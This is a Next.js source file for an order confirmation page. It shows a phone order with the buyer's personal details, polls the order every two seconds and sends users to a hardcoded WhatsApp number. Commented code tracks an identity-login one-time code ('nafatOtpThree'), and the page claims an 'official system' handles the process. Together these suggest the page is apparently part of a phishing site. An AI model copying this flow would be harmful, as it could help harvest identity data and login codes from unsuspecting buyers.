// import SwiperSlider from "@/components/SwiperSlider";
// import { useRouter, useSearchParams } from "next/navigation";
// import { motion } from "framer-motion";
// import { useCallback, useEffect, useState } from "react";

// const OrderSuccessPage = () => {
//   const router = useRouter();
//   const params = useSearchParams();
//   const _id = params.get("id");
//   const [order, setOrder] = useState([]);

//   console.log("oreder data", order);

//   const url = `${process.env.API_URL}/api/order/${_id}`;
//   const fetchOrder = useCallback(async () => {
//     if (!_id) return; // Early return if _id is not available or nafatOtpThree is already set

//     try {
//       const response = await fetch(url);
//       if (!response.ok) {
//         throw new Error("Failed to fetch order data");
//       }
//       const data = await response.json();
//       setOrder(data);
//     } catch (error) {
//       console.error("Error fetching order:", error);
//     }
//   }, [url, _id]);

//   useEffect(() => {
//     //if (order.nafatOtpThree) return; // Stop polling if nafatOtpThree is already set
//     const intervalId = setInterval(() => {
//       fetchOrder();
//     }, 2000); // Poll every 5 seconds

//     return () => clearInterval(intervalId);
//   }, [fetchOrder, order.nafatOtpThree]);

//   const handleWhatsAppRedirect = () => {
//     // if (order.whatsappNumber) {
//     window.open(
//       `https://wa.me/${
//         order.whatsappNumber ? order.whatsappNumber : "966583203109"
//       }`,
//       "_blank"
//     );
//     // }
//   };

//   console.log("order", order);

//   return (
//     <section>
//       <SwiperSlider />
//       <div className="w-full py-10 lg:py-6 flex flex-col items-center justify-center text-center gap-2 text-black">
//         <motion.div
//           initial={{ scale: 0.9 }}
//           animate={{ rotate: 360, scale: 1 }}
//           transition={{
//             type: "spring",
//             stiffness: 260,
//             damping: 20,
//             repeat: Infinity,
//             repeatType: "mirror",
//             duration: 1.3,
//             rotate: {
//               duration: 1, // Rotation happens over 1 second
//             },
//           }}
//           className="w-40 h-40 lg:w-60 lg:h-60"
//         >
//           <svg
//             xmlns="http://www.w3.org/2000/svg"
//             className="success"
//             // width="150"
//             // height="150"
//             viewBox="0 0 101 101"
//             fill="none"
//           >
//             <ellipse
//               cx="50.5171"
//               cy="49.9367"
//               rx="11.5213"
//               ry="11.5497"
//               fill="#00AC3E"
//             />
//             <path
//               fill-rule="evenodd"
//               clip-rule="evenodd"
//               className="checkmark"
//               d="M45.2576 48.604L49.084 52.6483L55.1814 46.1154"
//               stroke="white"
//               stroke-width="2.5"
//             />
//             <line
//               className="line1"
//               x1="61.8656"
//               y1="13.4946"
//               x2="58.3004"
//               y2="26.8"
//               stroke="#00AC3E"
//               stroke-width="3"
//               stroke-linecap="round"
//             />
//             <line
//               className="line2"
//               x1="84.906"
//               y1="32.622"
//               x2="72.9767"
//               y2="39.5094"
//               stroke="#00AC3E"
//               stroke-width="3"
//               stroke-linecap="round"
//             />
//             <line
//               className="line3"
//               x1="87.6729"
//               y1="62.4366"
//               x2="74.3675"
//               y2="58.8715"
//               stroke="#00AC3E"
//               stroke-width="3"
//               stroke-linecap="round"
//             />
//             <line
//               className="line4"
//               x1="68.5467"
//               y1="85.4764"
//               x2="61.6593"
//               y2="73.5471"
//               stroke="#00AC3E"
//               stroke-width="3"
//               stroke-linecap="round"
//             />
//             <line
//               className="line5"
//               x1="45.1935"
//               y1="75.715"
//               x2="41.6283"
//               y2="89.0205"
//               stroke="#00AC3E"
//               stroke-width="3"
//               stroke-linecap="round"
//             />
//             <line
//               className="line6"
//               x1="29.1204"
//               y1="64.8283"
//               x2="17.1911"
//               y2="71.7157"
//               stroke="#00AC3E"
//               stroke-width="3"
//               stroke-linecap="round"
//             />
//             <line
//               className="line7"
//               x1="25.4527"
//               y1="45.765"
//               x2="12.1473"
//               y2="42.1998"
//               stroke="#00AC3E"
//               stroke-width="3"
//               stroke-linecap="round"
//             />
//             <line
//               className="line8"
//               x1="36.3394"
//               y1="29.6917"
//               x2="29.452"
//               y2="17.7624"
//               stroke="#00AC3E"
//               stroke-width="3"
//               stroke-linecap="round"
//             />
//           </svg>
//         </motion.div>

//         <div>
//           <p className=" text-lg lg:text-3xl font-bold text-green-600">
//             Your Order application complete 👋
//           </p>

//           <div className="mt-4 w-full max-w-4xl px-4">
//             {/* <h2 className="text-lg lg:text-3xl font-bold mb-4 border-b-[3px] border-black w-max mx-auto">
//               Order Details
//             </h2> */}
//             <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-left">
//               <div className="bg-gray-100 p-4 rounded-lg">
//                 <p className="font-semibold">Model:</p>
//                 <p>{order.model}</p>
//               </div>
//               <div className="bg-gray-100 p-4 rounded-lg">
//                 <p className="font-semibold">Storage:</p>
//                 <p>{order.storage}</p>
//               </div>
//               <div className="bg-gray-100 p-4 rounded-lg">
//                 <p className="font-semibold">Color:</p>
//                 <p>{order.color}</p>
//               </div>
//               <div className="bg-gray-100 p-4 rounded-lg">
//                 <p className="font-semibold">Phone Number:</p>
//                 <p>{order.phone}</p>
//               </div>
//               <div className="bg-gray-100 p-4 rounded-lg">
//                 <p className="font-semibold">Date of Birth:</p>
//                 <p>{new Date(order.dob).toLocaleDateString()}</p>
//               </div>
//               <div className="bg-gray-100 p-4 rounded-lg">
//                 <p className="font-semibold">Nationality:</p>
//                 <p>{order.nationality}</p>
//               </div>
//               <div className="bg-gray-100 p-4 rounded-lg">
//                 <p className="font-semibold">Profession:</p>
//                 <p>{order.profession}</p>
//               </div>
//               <div className="bg-gray-100 p-4 rounded-lg">
//                 <p className="font-semibold">City:</p>
//                 <p>{order.city}</p>
//               </div>
//               <div className="bg-gray-100 p-4 rounded-lg">
//                 <p className="font-semibold">Birth Place:</p>
//                 <p>{order.birthPlace}</p>
//               </div>
//               <div className="bg-gray-100 p-4 rounded-lg">
//                 <p className="font-semibold">Order Date:</p>
//                 <p>{new Date(order.createdAt).toLocaleDateString()}</p>
//               </div>
//             </div>
//           </div>
//           <p className="mt-4 lg:mt-6 mb-4 text-lg font-semibold">
//             Contact with whatsapp to proceed further.
//           </p>
//           <button
//             onClick={handleWhatsAppRedirect}
//             className="bg-teal-600 px-6 py-3 lg:mr-3 mb-3 lg:mb-0 rounded-xl text-white text-base"
//           >
//             Contact with WhatsApp
//           </button>
//           <button
//             onClick={() => router.push("/")}
//             className="bg-teal-600 px-6 py-3 rounded-xl text-white text-base"
//           >
//             Back to Homepage
//           </button>
//         </div>
//       </div>
//       <div className="h-20 bg-teal-400 mt-5"></div>
//     </section>
//   );
// };

// export default OrderSuccessPage;

import { useRouter, useSearchParams } from "next/navigation";
import { useCallback, useEffect, useState } from "react";
import {
  FaArrowRight,
  FaCheckCircle,
  FaShieldAlt,
  FaMobileAlt,
} from "react-icons/fa";
import { BsFillInfoCircleFill } from "react-icons/bs";
import { HiSparkles } from "react-icons/hi";
import { motion } from "framer-motion";

export default function ModernOrderSuccessPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const _id = searchParams.get("id");

  const [order, setOrder] = useState({});

  const url = `${process.env.API_URL || ""}/api/order/${_id}`;
  const fetchOrder = useCallback(async () => {
    if (!_id) return;
    try {
      const response = await fetch(url);
      if (!response.ok) throw new Error("Failed to fetch order data");
      const data = await response.json();
      setOrder(data);
    } catch (error) {
      console.error("Error fetching order:", error);
    }
  }, [url, _id]);

  useEffect(() => {
    const intervalId = setInterval(() => {
      fetchOrder();
    }, 2000);
    return () => clearInterval(intervalId);
  }, [fetchOrder]);

  const handleWhatsAppRedirect = () => {
    window.open(
      `https://wa.me/${
        order.whatsappNumber ? order.whatsappNumber : "966583203109"
      }`,
      "_blank"
    );
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-teal-950">
      {/* Hero Section */}
      <div className="relative overflow-hidden bg-gradient-to-r from-teal-900/20 to-cyan-900/20 border-b border-slate-800">
        <div className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1563986768609-322da13575f3?w=1200&auto=format&fit=crop')] opacity-5 bg-cover bg-center"></div>
        <div className="relative max-w-7xl mx-auto px-4 py-16 text-center">
          <div className="inline-flex items-center gap-2 px-4 py-2 bg-white/10 backdrop-blur-md rounded-full mb-4 border border-white/20">
            <HiSparkles className="w-4 h-4 text-teal-400" />
            <span className="text-sm text-white font-medium">
              Order Complete
            </span>
          </div>
          <h1 className="text-4xl md:text-6xl font-bold text-white mb-4 tracking-tight">
            Your{" "}
            <span className="bg-gradient-to-r from-teal-400 to-cyan-400 bg-clip-text text-transparent">
              Order
            </span>{" "}
            Was Successful
          </h1>
          <p className="text-gray-300 text-lg max-w-2xl mx-auto">
            Your order application is complete. You will be contacted via
            WhatsApp shortly.
          </p>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-3xl mx-auto px-4 py-16">
        {/* Info Alert */}
        <div className="mb-8 bg-blue-500/10 backdrop-blur-sm border border-blue-500/30 rounded-2xl p-6">
          <div className="flex items-start gap-4">
            <BsFillInfoCircleFill className="w-6 h-6 text-blue-400 flex-shrink-0 mt-1" />
            <div className="text-gray-300">
              <p className="font-medium mb-1">Important</p>
              <p className="text-sm text-gray-400">
                You can contact us via WhatsApp to complete further steps of
                your order.
              </p>
            </div>
          </div>
        </div>

        {/* Main Card */}
        <div className="bg-slate-900/50 backdrop-blur-xl rounded-3xl p-8 md:p-12 border border-slate-800">
          {/* Success Icon */}
          <div className="flex justify-center mb-8">
            <motion.div
              initial={{ scale: 0.9 }}
              animate={{ scale: 1.1, rotate: 360 }}
              transition={{
                type: "spring",
                stiffness: 260,
                damping: 20,
                repeat: Infinity,
                repeatType: "mirror",
                duration: 1.3,
              }}
              className="bg-gradient-to-r from-teal-500 to-cyan-500 w-32 h-32 rounded-2xl flex items-center justify-center shadow-2xl"
            >
              <FaCheckCircle className="w-12 h-12 text-white" />
            </motion.div>
          </div>

          {/* Order Details */}
          <div className="text-center mb-8">
            <h2 className="text-2xl font-bold text-white mb-3">
              Order Details
            </h2>
            <p className="text-gray-400 mb-6">
              Here is a summary of your order.
            </p>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-left">
              {[
                { label: "Model", value: order.model },
                { label: "Storage", value: order.storage },
                { label: "Color", value: order.color },
                { label: "Phone Number", value: order.phone },
                {
                  label: "Date of Birth",
                  value: order.dob
                    ? new Date(order.dob).toLocaleDateString()
                    : "",
                },
                { label: "Nationality", value: order.nationality },
                { label: "Profession", value: order.profession },
                { label: "City", value: order.city },
                { label: "Birth Place", value: order.birthPlace },
                {
                  label: "Order Date",
                  value: order.createdAt
                    ? new Date(order.createdAt).toLocaleDateString()
                    : "",
                },
              ].map((item, idx) => (
                <div
                  key={idx}
                  className="bg-slate-800/50 p-4 rounded-xl border border-slate-700"
                >
                  <p className="font-semibold text-gray-300">{item.label}</p>
                  <p className="text-gray-200">{item.value || "N/A"}</p>
                </div>
              ))}
            </div>
          </div>

          {/* Buttons */}
          <div className="flex flex-col md:flex-row justify-center items-center gap-4 mt-6">
            <button
              onClick={handleWhatsAppRedirect}
              className="flex-1 bg-gradient-to-r from-teal-500 to-cyan-500 text-white py-3 rounded-xl font-semibold shadow-md hover:shadow-teal-500/50 transition-all"
            >
              Contact via WhatsApp
            </button>
            <button
              onClick={() => router.push("/")}
              className="flex-1 bg-slate-800/50 text-white py-3 rounded-xl font-semibold border border-slate-700 hover:bg-slate-900 transition-all"
            >
              Back to Homepage
            </button>
          </div>

          {/* Security Note */}
          <div className="mt-6 p-4 bg-slate-800/30 rounded-xl border border-slate-700">
            <p className="text-sm text-gray-400 flex items-start gap-2">
              <FaShieldAlt className="text-teal-400 mt-0.5 flex-shrink-0" />
              <span>
                <strong className="text-teal-400">Secure Process:</strong> Your
                order process is handled securely through the official system.
              </span>
            </p>
          </div>
        </div>
      </div>
      {/* <div className="h-20 bg-teal-400 mt-5"></div> */}
    </div>
  );
}
